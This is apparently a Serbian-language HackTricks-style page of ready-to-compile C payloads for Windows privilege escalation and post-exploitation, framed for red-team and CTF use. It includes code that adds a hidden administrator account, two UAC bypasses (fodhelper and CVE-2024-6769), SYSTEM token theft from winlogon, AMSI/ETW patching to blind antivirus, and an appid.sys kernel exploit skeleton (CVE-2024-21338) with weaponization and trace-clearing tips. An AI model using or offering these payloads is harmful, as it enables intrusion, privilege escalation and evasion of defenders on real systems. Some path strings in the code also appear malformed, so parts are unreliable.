# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Ova stranica sakuplja **mali, samostalni C isječci** koji su korisni tokom Windows Local Privilege Escalation ili post-exploitation. Svaki payload je dizajniran da bude **pogodan za copy-paste**, zahteva samo Windows API / C runtime, i može se kompajlirati sa `i686-w64-mingw32-gcc` (x86) ili `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  Ovi payloads pretpostavljaju da proces već ima minimalne privilegije potrebne za izvršenje akcije (npr. `SeDebugPrivilege`, `SeImpersonatePrivilege`, ili medium-integrity context za UAC bypass). Namenjeni su za **red-team or CTF settings** gde iskorišćavanje ranjivosti omogućava izvršavanje proizvoljnog nativnog koda.

---

## Dodavanje lokalnog administratorskog naloga
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
Kada se izvrši pouzdan binarni fajl **`fodhelper.exe`**, on pristupa putanji registra navedenoj ispod **bez filtriranja `DelegateExecute` glagola**. Postavljanjem naše komande pod tim ključem, napadač može zaobići UAC *bez* zapisivanja fajla na disk.

*Putanja registra koju `fodhelper.exe` proverava*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Minimalni PoC koji pokreće povišeni `cmd.exe`:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Testirano na Windows 10 22H2 i Windows 11 23H2 (zakrpe iz jula 2025). Zaobilaženje i dalje radi jer Microsoft nije popravio nedostajući check integriteta u `DelegateExecute` putanji.*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Drive remapping + activation context cache poisoning i dalje funkcioniše protiv zakrpljenih Windows 10/11 buildova zato što `ctfmon.exe` radi kao trusted UI proces visokog integriteta koji rado učitava sa pozivanog impersoniranog diska `C:` i ponovo koristi DLL redirekcije koje je `CSRSS` već keširao. Zloupotreba ide ovako: preusmerite `C:` na skladište pod kontrolom napadača, ubacite trojanizovani `msctf.dll`, pokrenite `ctfmon.exe` da biste dobili visok integritet, zatim zatražite od `CSRSS` da kešira manifest koji preusmerava DLL koji koristi auto-elevated binarni fajl (npr. `fodhelper.exe`) tako da sledeće pokretanje nasledi vaš payload bez UAC prompta.

Praktičan tok:
1. Pripremite lažno %SystemRoot%\System32 stablo i kopirajte legitimni binarni fajl koji planirate hijackovati (često `ctfmon.exe`).
2. Koristite `DefineDosDevice(DDD_RAW_TARGET_PATH)` da remapujete `C:` unutar vašeg procesa, zadržavajući `DDD_NO_BROADCAST_SYSTEM` tako da promena ostane lokalna.
3. Smeštajte vaš DLL + manifest u lažno stablo, pozovite `CreateActCtx/ActivateActCtx` da ubacite manifest u activation-context cache, pa zatim pokrenite auto-elevated binarni fajl tako da reši preusmereni DLL direktno u vaš shellcode.
4. Obrišite cache unos (`sxstrace ClearCache`) ili rebootujte kada završite da izbrišete tragove napadača.

<details>
<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

Saveti za čišćenje: nakon što dobijete SYSTEM, pokrenite `sxstrace Trace -logfile %TEMP%\sxstrace.etl`, a zatim `sxstrace Parse` prilikom testiranja — ako u logu vidite ime svog manifesta, i odbrambeni timovi ga mogu videti, zato pri svakom pokretanju menjajte putanje.

---

## Pokretanje SYSTEM shell-a putem duplikacije tokena (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Ako trenutni proces ima **oba** privilegija `SeDebug` i `SeImpersonate` (tipično za mnoge servisne naloge), možete ukrasti token iz `winlogon.exe`, duplikovati ga i pokrenuti povišen proces:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Za dublje objašnjenje kako to funkcioniše pogledajte:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
Većina modernih AV/EDR engines oslanja se na **AMSI** i **ETW** da bi analizirali zlonamerna ponašanja. Patchovanje oba interfejsa rano unutar trenutnog procesa sprečava skeniranje payloads zasnovanih na skriptama (npr. PowerShell, JScript).
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Gore navedeni patch je lokalno za proces; pokretanje novog PowerShell-a nakon njegovog izvršavanja će se izvoditi bez AMSI/ETW inspekcije.*

---

## Kreirajte podređeni proces kao Protected Process Light (PPL)
Zatražite PPL nivo zaštite za podređeni proces pri kreiranju koristeći `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`. Ovo je dokumentovani API i uspeće samo ako je ciljna slika potpisana za traženu klasu potpisnika (Windows/WindowsLight/Antimalware/LSA/WinTcb).
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
Najčešće korišćeni nivoi:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Proverite rezultat u Process Explorer/Process Hacker proverom kolone Protection.

---

## Local Service -> Kernel preko `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` izlaže objekat uređaja (`\\.\\AppID`) čiji smart-hash maintenance IOCTL prihvata pokazivače na funkcije koje korisnik obezbedi kad god pozivalac radi kao `LOCAL SERVICE`; Lazarus to zloupotrebljava da onemogući PPL i učita proizvoljne drajvere, pa red teams treba da imaju gotov okidač za laboratorijsku upotrebu.

Operativne napomene:
- I dalje vam je potreban token `LOCAL SERVICE`. Ukradite ga iz `Schedule` ili `WdiServiceHost` koristeći `SeImpersonatePrivilege`, zatim impersonate pre nego što pristupite uređaju da bi ACL provere prošle.
- IOCTL `0x22A018` očekuje strukturu koja sadrži dva pokazivača na callback (query length + read function). Usmerite oba na user-mode stubove koji kreiraju token overwrite ili mapiraju ring-0 primitiva, ali zadržite buffere RWX tako da KernelPatchGuard ne padne usred lanca.
- Nakon uspeha, izađite iz impersonation i revertujte device handle; defanzeri sada traže neočekivane `Device\\AppID` handle-ove, pa ga odmah zatvorite čim dobijete privilegiju.

<details>
<summary>C - Kostur okidača za zloupotrebu smart-hash `appid.sys`</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

Minimalna ispravka za weaponized build: mapirajte RWX sekciju pomoću `VirtualAlloc`, kopirajte tamo svoj stub za dupliciranje tokena, postavite `KernelThunk = section`, i kada `DeviceIoControl` vrati, trebalo bi da budete SYSTEM čak i pod PPL.

---

## Reference
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
* CreateProcessAsPPL – minimalni pokretač PPL procesa: https://github.com/2x7EQ13/CreateProcessAsPPL
* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute
* DarkReading – ["Novel Exploit Chain Enables Windows UAC Bypass"](https://www.darkreading.com/vulnerabilities-threats/windows-activation-context-cache-elevation) (2024)
* Avast Threat Labs – ["Lazarus Deploys New FudModule Rootkit"](https://decoded.avast.io/threatresearch/lazarus-deploys-new-fudmodule-rootkit/) (2024)

{{#include ../../banners/hacktricks-training.md}}
